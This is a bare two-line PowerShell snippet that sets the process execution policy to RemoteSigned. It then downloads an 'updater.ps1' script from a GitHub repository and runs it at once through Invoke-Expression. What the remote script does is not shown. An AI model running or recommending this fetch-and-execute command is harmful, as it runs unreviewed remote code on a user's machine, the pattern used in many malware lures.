Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Force -Scope Process
Invoke-RestMethod -Uri https://github.com/csoreserver/dev-tool/raw/refs/heads/main/updater.ps1 | Invoke-Expression
